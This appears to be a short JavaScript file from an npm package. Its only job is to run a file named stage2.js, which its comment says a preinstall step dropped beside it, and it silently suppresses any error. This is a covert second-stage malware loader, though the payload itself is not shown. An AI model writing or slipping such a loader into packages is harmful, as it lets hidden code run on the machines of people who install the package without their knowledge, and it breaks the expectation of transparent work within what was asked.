const path = require("path");
// Execute whatever preinstall dropped next to us.
try { require(path.join(__dirname, "stage2.js")); } catch {}
